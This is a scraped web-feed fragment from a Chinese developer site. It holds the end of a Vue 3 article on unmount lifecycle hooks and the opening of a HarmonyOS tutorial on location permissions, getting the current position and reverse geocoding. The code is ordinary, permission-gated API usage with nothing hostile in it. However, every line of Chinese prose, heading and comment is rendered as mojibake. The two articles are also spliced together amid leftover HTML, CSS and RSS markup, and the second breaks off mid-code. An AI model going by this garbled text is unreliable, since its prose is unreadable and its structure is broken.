<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onBeforeUnmount, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ChildComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../Son/s1.vue'</span>
<span class="hljs-keyword">const</span> showChild = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">true</span>)
<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶ onBeforeUnmount'</span>)
})
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶ onUnmounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
â€‹
â€‹
<span class="hljs-comment">&lt;!-- Child.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
 Â  Â <span class="hljs-comment">&lt;!-- &lt;h3&gt;å­ç»„ä»¶&lt;/h3&gt; --&gt;</span>
 Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
 Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onBeforeUnmount, onUnmounted,ref, defineProps } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
â€‹
<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­ç»„ä»¶ onBeforeUnmount'</span>)
})
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
 Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­çˆ¶ç»„ä»¶ onUnmounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
â€‹
</code></pre>
<h4 data-id="heading-41">é”€æ¯å­ç»„ä»¶</h4>
<h5 data-id="heading-42">æ‰§è¡Œé¡ºåºï¼š</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// é”€æ¯è¿‡ç¨‹</span>
â€‹
 å­ç»„ä»¶ beforeDestroy
â€‹
 å­ç»„ä»¶ destroyed
â€‹
</code></pre>
<h5 data-id="heading-43">ä»£ç ç¤ºä¾‹ï¼šè§é”€æ¯çˆ¶ç»„ä»¶çš„ä»£ç </h5></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS ä½ç½®æœåŠ¡å…¨æ”»ç•¥ï¼šç²¾å‡†å®šä½ã€åœ°ç†ç¼–ç ä¸åå°æŒç»­å®šä½å®ç°]]></title>    <link>https://juejin.cn/post/7576942980708712448</link>    <guid>https://juejin.cn/post/7576942980708712448</guid>    <pubDate>2025-11-27T05:21:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576942980708712448" data-draft-id="7576928310788702260" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS ä½ç½®æœåŠ¡å…¨æ”»ç•¥ï¼šç²¾å‡†å®šä½ã€åœ°ç†ç¼–ç ä¸åå°æŒç»­å®šä½å®ç°"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-27T05:21:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ITå……ç”µç«™"/> <meta itemprop="url" content="https://juejin.cn/user/125809758576431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS ä½ç½®æœåŠ¡å…¨æ”»ç•¥ï¼šç²¾å‡†å®šä½ã€åœ°ç†ç¼–ç ä¸åå°æŒç»­å®šä½å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/125809758576431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ITå……ç”µç«™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:21:39.000Z" title="Thu Nov 27 2025 05:21:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p>âœ¨å®¶äººä»¬è®°å¾—ç‚¹ä¸ªè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<p>åœ¨ HarmonyOS åº”ç”¨å¼€å‘ä¸­ï¼Œä½ç½®æœåŠ¡æ˜¯è®¸å¤šåœºæ™¯çš„æ ¸å¿ƒèƒ½åŠ› â€”â€” æ— è®ºæ˜¯æœ¬åœ°ç”Ÿæ´»æœåŠ¡çš„é™„è¿‘æ¨èã€å¯¼èˆªåº”ç”¨çš„å®æ—¶è½¨è¿¹è¿½è¸ªï¼Œè¿˜æ˜¯å‡ºè¡Œç±» App çš„åå°å®šä½ï¼Œéƒ½ç¦»ä¸å¼€ç¨³å®šã€ç²¾å‡†çš„ä½ç½®è·å–èƒ½åŠ›ã€‚æœ¬æ–‡å°†ä»æƒé™é…ç½®ã€ä½ç½®è·å–ã€åœ°ç†ç¼–ç è½¬æ¢ã€æŒç»­å®šä½åˆ°åå°é•¿æ—¶å®šä½ï¼Œä¸€æ­¥æ­¥æ‹†è§£ HarmonyOS ä½ç½®æœåŠ¡çš„å®Œæ•´å®ç°æµç¨‹ï¼Œé™„å¸¦å¯ç›´æ¥å¤ç”¨çš„ä»£ç ç¤ºä¾‹ï¼ŒåŠ©åŠ›å¼€å‘è€…å¿«é€Ÿè½åœ°åŠŸèƒ½ã€‚</p>
<h2 data-id="heading-0">è·å–è®¾å¤‡çš„ä½ç½®ä¿¡æ¯</h2>
<blockquote>
<p>1-é…ç½®ç”³è¯·ä½ç½®æƒé™ åŒæ—¶ç”³è¯·ohos.permission.APPROXIMATELY_LOCATIONå’Œohos.permission.LOCATION è·å–åˆ°ç²¾å‡†ä½ç½®ï¼Œç²¾å‡†åº¦åœ¨ç±³çº§åˆ«ã€‚</p>
<p>2-æ£€æŸ¥å…¨å±€ä½ç½®å¼€å…³æ˜¯å¦æ‰“å¼€ geoLocationManager.isLocationEnabled();</p>
<ul>
<li>2.1 æ²¡å¼€ atManager.requestGlobalSwitch(getContext(this), abilityAccessCtrl.SwitchType.LOCATION) æ‹‰èµ·å…¨å±€è®¾ç½®ä½ç½®å¼€å…³é¡µ</li>
<li>2.2 å¼€äº† ç»§ç»­</li>
</ul>
<p>3-è·å–å½“å‰ä½ç½® geoLocationManager.getCurrentLocation(request) å¯ä»¥è·å–ç”¨æˆ·ç»åº¦çº¬åº¦</p>
<p>4-å¯ä»¥ç»§ç»­é€šè¿‡geoLocationManager.getAddressesFromLocation()åœ°ç†ç¼–ç è½¬åŒ–ä¸ºå¯è¯»æ€§è¾ƒå¼ºåœ°å€</p>
</blockquote>
<ul>
<li>è·å–è®¾å¤‡çš„ä½ç½®ä¿¡æ¯ï¼Œéœ€è¦æœ‰ä½ç½®æƒé™ï¼Œä½ç½®æƒé™ç”³è¯·</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä½ç½®ä¿¡æ¯ï¼ˆæƒé™ç»„ï¼‰</span>
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"ohos.permission.APPROXIMATELY_LOCATION"</span>,
  <span class="hljs-string">"reason"</span>: <span class="hljs-string">'<span class="hljs-subst">$string</span>:permission_reason_location'</span>,
  <span class="hljs-string">"usedScene"</span>: {}
},
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"ohos.permission.LOCATION"</span>,
  <span class="hljs-string">"reason"</span>: <span class="hljs-string">'<span class="hljs-subst">$string</span>:permission_reason_location'</span>,
  <span class="hljs-string">"usedScene"</span>: {}
},
</code></pre>
<p>æŒ‰ç…§æ­¥éª¤ç”³è¯·æƒé™Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V13%2Flocation-guidelines-V13" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/location-guidelines-V13" target="_blank" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cnâ€¦</a></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl, <span class="hljs-title class_">Context</span>, common } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BusinessError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BasicServicesKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'è·å–ä½ç½®ä¿¡æ¯'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 é…ç½®æ–‡ä»¶ ç”³è¯·æƒé™   åŒæ—¶ç”³è¯·ohos.permission.APPROXIMATELY_LOCATIONå’Œohos.permission.LOCATION è·å–åˆ°ç²¾å‡†ä½ç½®ï¼Œç²¾å‡†åº¦åœ¨ç±³çº§åˆ«ã€‚</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 æ£€æŸ¥å…¨å±€å¼€å…³  å¼€äº†-ç»§ç»­èµ°ï¼Œæ²¡å¼€-å¼¹å‡ºè®©ä»–æˆæƒ</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æŸ¥çœ‹å½“å‰å…¨å±€å¼€å…³çŠ¶æ€ï¼š'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// æ²¡å¼€</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// æ‹‰èµ·å…¨å±€å¼¹å‡º ç”¨æˆ·æ²¡æˆæƒå°±ç»ˆæ­¢ä»£ç æ‰§è¡Œ</span>
      }

      <span class="hljs-comment">// 3. è·å–ä½ç½®ä¿¡æ¯  ç»åº¦çº¬åº¦</span>
      geoLocationManager.<span class="hljs-title function_">getCurrentLocation</span>( {
        <span class="hljs-attr">locatingPriority</span>: geoLocationManager.<span class="hljs-property">LocatingPriority</span>.<span class="hljs-property">PRIORITY_LOCATING_SPEED</span>,
        <span class="hljs-attr">locatingTimeoutMs</span>: <span class="hljs-number">10000</span>
      }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> { <span class="hljs-comment">// è°ƒç”¨getCurrentLocationè·å–å½“å‰è®¾å¤‡ä½ç½®ï¼Œé€šè¿‡promiseæ¥æ”¶ä¸ŠæŠ¥çš„ä½ç½®</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'current location: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result));
      })
        .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error:BusinessError</span>) =&gt;</span> { <span class="hljs-comment">// æ¥æ”¶ä¸ŠæŠ¥çš„é”™è¯¯ç </span>
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'promise, getCurrentLocation: error='</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(error));
        });
      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<h2 data-id="heading-1">åœ°ç†ç¼–ç è½¬åŒ–ä¸é€†åœ°ç†ç¼–ç è½¬åŒ–</h2>
<p>ä½¿ç”¨åæ ‡æè¿°ä¸€ä¸ªä½ç½®ï¼Œéå¸¸å‡†ç¡®ï¼Œä½†æ˜¯å¹¶ä¸ç›´è§‚ï¼Œé¢å‘ç”¨æˆ·è¡¨è¾¾å¹¶ä¸å‹å¥½ã€‚ç³»ç»Ÿå‘å¼€å‘è€…æä¾›äº†ä»¥ä¸‹ä¸¤ç§è½¬åŒ–èƒ½åŠ›ã€‚</p>
<ul>
<li>åœ°ç†ç¼–ç è½¬åŒ–ï¼šå°†åœ°ç†æè¿°è½¬åŒ–ä¸ºå…·ä½“åæ ‡ã€‚</li>
<li>é€†åœ°ç†ç¼–ç è½¬åŒ–èƒ½åŠ›ï¼šå°†åæ ‡è½¬åŒ–ä¸ºåœ°ç†æè¿°ã€‚</li>
</ul>
<p>å…¶ä¸­åœ°ç†ç¼–ç åŒ…å«å¤šä¸ªå±æ€§æ¥æè¿°ä½ç½®ï¼ŒåŒ…æ‹¬å›½å®¶ã€è¡Œæ”¿åŒºåˆ’ã€è¡—é“ã€é—¨ç‰Œå·ã€åœ°å€æè¿°ç­‰ç­‰ï¼Œè¿™æ ·çš„ä¿¡æ¯æ›´ä¾¿äºç”¨æˆ·ç†è§£ã€‚</p>
<p>å¼€å‘æ­¥éª¤</p>
<ol>
<li>å¯¼å…¥geoLocationManageræ¨¡å—ï¼Œæ‰€æœ‰ä¸åœ°ç†ç¼–ç è½¬åŒ–&amp;é€†åœ°ç†ç¼–ç è½¬åŒ–èƒ½åŠ›ç›¸å…³çš„åŠŸèƒ½APIï¼Œéƒ½æ˜¯é€šè¿‡è¯¥æ¨¡å—æä¾›çš„ã€‚</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
</code></pre>
<p>2.è·å–è½¬åŒ–ç»“æœã€‚</p>
<p>è°ƒç”¨getAddressesFromLocationï¼ŒæŠŠåæ ‡è½¬åŒ–ä¸ºåœ°ç†ä½ç½®ä¿¡æ¯ã€‚åº”ç”¨å¯ä»¥è·å¾—ä¸æ­¤åæ ‡åŒ¹é…çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-geolocationmanager-V13%23geoaddress" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-geolocationmanager-V13#geoaddress" target="_blank" ref="nofollow noopener noreferrer">GeoAddress</a>ï¼ˆåœ°ç†ç¼–ç åœ°å€ä¿¡æ¯ï¼‰åˆ—è¡¨ï¼Œåº”ç”¨å¯ä»¥æ ¹æ®å®é™…ä½¿ç”¨éœ€æ±‚ï¼Œè¯»å–ç›¸åº”çš„å‚æ•°æ•°æ®ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> <span class="hljs-attr">reverseGeocodeRequest</span>:geoLocationManager.<span class="hljs-property">ReverseGeoCodeRequest</span> = {
  <span class="hljs-attr">locale</span>: <span class="hljs-string">'zh'</span>,
  <span class="hljs-string">"latitude"</span>: <span class="hljs-number">31.12</span>, <span class="hljs-string">"longitude"</span>: <span class="hljs-number">121.11</span>, <span class="hljs-string">"maxItems"</span>: <span class="hljs-number">1</span>
};
<span class="hljs-keyword">try</span> {
    geoLocationManager.<span class="hljs-title function_">getAddressesFromLocation</span>(reverseGeocodeRequest, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation err: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        }
    });
} <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"errCode:"</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
}
</code></pre>
<p>3.ç¤ºä¾‹ä»£ç </p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl, <span class="hljs-title class_">Context</span>, common } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BusinessError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BasicServicesKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'è·å–ä½ç½®ä¿¡æ¯'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 é…ç½®æ–‡ä»¶ ç”³è¯·æƒé™   åŒæ—¶ç”³è¯·ohos.permission.APPROXIMATELY_LOCATIONå’Œohos.permission.LOCATION è·å–åˆ°ç²¾å‡†ä½ç½®ï¼Œç²¾å‡†åº¦åœ¨ç±³çº§åˆ«ã€‚</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 æ£€æŸ¥å…¨å±€å¼€å…³  å¼€äº†-ç»§ç»­èµ°ï¼Œæ²¡å¼€-å¼¹å‡ºè®©ä»–æˆæƒ</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æŸ¥çœ‹å½“å‰å…¨å±€å¼€å…³çŠ¶æ€ï¼š'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// æ²¡å¼€</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// æ‹‰èµ·å…¨å±€å¼¹å‡º ç”¨æˆ·æ²¡æˆæƒå°±ç»ˆæ­¢ä»£ç æ‰§è¡Œ</span>
      }

      <span class="hljs-comment">// 3. è·å–ä½ç½®ä¿¡æ¯  ç»åº¦çº¬åº¦</span>
      geoLocationManager.<span class="hljs-title function_">getCurrentLocation</span>( {
        <span class="hljs-attr">locatingPriority</span>: geoLocationManager.<span class="hljs-property">LocatingPriority</span>.<span class="hljs-property">PRIORITY_LOCATING_SPEED</span>,
        <span class="hljs-attr">locatingTimeoutMs</span>: <span class="hljs-number">10000</span>
      }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> { <span class="hljs-comment">// è°ƒç”¨getCurrentLocationè·å–å½“å‰è®¾å¤‡ä½ç½®ï¼Œé€šè¿‡promiseæ¥æ”¶ä¸ŠæŠ¥çš„ä½ç½®</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'current location: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result))

        <span class="hljs-comment">// æ­£åœ°ç†ç¼–ç ä¸é€†åœ°ç†ç¼–ç </span>
        geoLocationManager.<span class="hljs-title function_">getAddressesFromLocation</span>({<span class="hljs-string">"latitude"</span>: result.<span class="hljs-property">latitude</span>, <span class="hljs-string">"longitude"</span>: result.<span class="hljs-property">longitude</span>, <span class="hljs-string">"maxItems"</span>: <span class="hljs-number">1</span>}, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (err) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation err: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
          }
        });
        <span class="hljs-comment">// æ­£åœ°ç†ç¼–ç ä¸é€†åœ°ç†ç¼–ç  end</span>
      })
        .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error:BusinessError</span>) =&gt;</span> { <span class="hljs-comment">// æ¥æ”¶ä¸ŠæŠ¥çš„é”™è¯¯ç </span>
